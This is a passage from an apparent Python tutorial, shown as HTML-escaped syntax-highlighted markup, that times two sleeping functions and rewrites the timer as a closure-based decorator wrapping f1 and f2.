&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;1&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;   			&lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; 通过睡眠，模拟函数执行的时间  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f2&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;2&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;timer&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f1&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  					&lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; function f1 run time 1.0005981922149658  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;timer&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f2&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  					&lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; function f2 run time 2.00011944770813  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;While this approach works, it can be optimized for efficiency. Instead of calling the &lt;code&gt;timer&lt;&#x2F;code&gt; function directly each time, we can use &lt;strong&gt;closures&lt;&#x2F;strong&gt; to improve it.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-python&quot;&gt;import&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;timer&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-python&quot;&gt;func&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-comment z-block z-documentation z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-begin z-python&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;&#x2F;span&gt; Prints function execution time &lt;span class=&quot;z-punctuation z-definition z-comment z-end z-python&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;    &lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;wrapper&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;        &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;start&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;        &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;func&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Execute the original function
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;        &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;Function &lt;span class=&quot;z-constant z-other z-placeholder z-python&quot;&gt;%s&lt;&#x2F;span&gt; run time: &lt;span class=&quot;z-constant z-other z-placeholder z-python&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;%&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-sequence z-tuple z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-sequence z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;func&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-support z-variable z-magic z-python&quot;&gt;__name__&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-sequence z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;-&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;start&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-sequence z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-keyword z-control z-flow z-return z-python&quot;&gt;return&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;wrapper&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f1&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;1&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Simulate function execution time
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f2&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;2&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;Before assigning f1:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f1&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; &amp;lt;function f1 at 0x005D6738&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f1&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;timer&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f1&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; f1 is now wrapped with the timer decorator
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;After assigning f1:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f1&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; &amp;lt;function timer.&amp;lt;locals&amp;gt;.wrapper at 0x00E43270&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f2&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;timer&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f2&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; f2 is also wrapped with the timer decorator
